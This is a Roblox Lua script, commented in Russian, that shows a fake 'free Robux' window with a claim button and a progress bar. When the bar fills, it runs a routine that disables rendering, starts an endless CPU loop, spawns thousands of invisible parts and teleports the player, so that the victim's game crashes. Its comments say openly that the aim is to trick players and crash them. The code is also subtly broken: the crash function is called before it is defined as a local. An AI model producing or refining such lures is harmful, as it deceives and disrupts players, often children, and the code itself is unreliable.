-- ЗЕЛЁНОЕ GUI "БЕСПЛАТНЫЕ РОБУКСЫ" + ПРОГРЕСС-БАР + КРАШ (SWILL)
local player = game.Players.LocalPlayer

-- СОЗДАЁМ ГУИ
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui
screenGui.ResetOnSpawn = false

-- ОСНОВНАЯ ПАНЕЛЬ (ЗЕЛЁНАЯ)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 300)
frame.Position = UDim2.new(0.5, -225, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(34, 139, 34) -- ТЁМНО-ЗЕЛЁНЫЙ
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

-- ЗАГОЛОВОК
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🎁 БЕСПЛАТНЫЕ РОБУКСЫ"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

-- ПОДЗАГОЛОВОК
local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -40, 0, 40)
sub.Position = UDim2.new(0, 20, 0, 65)
sub.BackgroundTransparency = 1
sub.Text = "Нажмите кнопку, чтобы получить Robux"
sub.TextColor3 = Color3.fromRGB(220, 255, 220)
sub.TextScaled = true
sub.Font = Enum.Font.SourceSans
sub.Parent = frame

-- ПРОГРЕСС-БАР (ФОН)
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 300, 0, 30)
progressBg.Position = UDim2.new(0.5, -150, 0.5, 10)
progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
progressBg.BorderSizePixel = 0
progressBg.Parent = frame

-- ПРОГРЕСС-БАР (ЗАПОЛНЕНИЕ)
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.Position = UDim2.new(0, 0, 0, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- ЯРКО-ЗЕЛЁНЫЙ
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBg

-- ТЕКСТ НА ПРОГРЕСС-БАРЕ
local progressText = Instance.new("TextLabel")
progressText.Size = UDim2.new(1, 0, 1, 0)
progressText.Position = UDim2.new(0, 0, 0, 0)
progressText.BackgroundTransparency = 1
progressText.Text = "0%"
progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
progressText.TextScaled = true
progressText.Font = Enum.Font.SourceSansBold
progressText.Parent = progressBg

-- КНОПКА "ПОЛУЧИТЬ"
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0.5, -100, 0.8, 0)
button.BackgroundColor3 = Color3.fromRGB(0, 200, 0) -- ЗЕЛЁНАЯ
button.Text = "💎 ПОЛУЧИТЬ ROBUX"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.Font = Enum.Font.SourceSansBold
button.Parent = frame

-- КНОПКА ЗАКРЫТЬ (КРЕСТИК)
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 40, 0, 40)
close.Position = UDim2.new(1, -45, 0, 5)
close.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
close.Text = "✕"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextScaled = true
close.Parent = frame
close.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- ФУНКЦИЯ ПРОГРЕСС-БАРА (5 СЕКУНД)
local function startProgress()
    button.Visible = false -- СКРЫВАЕМ КНОПКУ
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressText.Text = "0%"

    for i = 0, 100 do
        local percent = i
        progressFill.Size = UDim2.new(percent / 100, 0, 1, 0)
        progressText.Text = percent .. "%"
        task.wait(0.05) -- 5 СЕКУНД (100 * 0.05 = 5)
    end

    -- КОГДА ДОСТИГЛИ 100% — КРАШ
    progressText.Text = "✅ ГОТОВО!"
    task.wait(0.3)
    crashGame()
end

-- ФУНКЦИЯ КРАША (ВЫЛЕТ)
local function crashGame()
    -- ОТКЛЮЧАЕМ РЕНДЕРИНГ
    pcall(function()
        game:GetService("RunService"):Set3dRenderingEnabled(false)
    end)

    -- БЕСКОНЕЧНЫЙ ЦИКЛ (НАГРУЗКА)
    spawn(function()
        while true do
            local a = {}
            for i = 1, 100000 do
                a[i] = i * i * i
            end
            task.wait()
        end
    end)

    -- СОЗДАЁМ ОБЪЕКТЫ (ПАМЯТЬ)
    spawn(function()
        for i = 1, 5000 do
            local p = Instance.new("Part")
            p.Parent = workspace
            p.Size = Vector3.new(50, 50, 50)
            p.Anchored = true
            p.CanCollide = false
            p.Transparency = 1
            task.wait()
        end
    end)

    -- ЗАМОРОЗКА ИГРЫ
    pcall(function()
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    end)
end

-- НАЖАТИЕ КНОПКИ — ЗАПУСК ПРОГРЕСС-БАРА
button.MouseButton1Click:Connect(function()
    startProgress()
end)

print("[ГУИ] Зелёное окно с робуксами загружено. Нажми 'Получить' — запустится прогресс-бар, затем краш.")
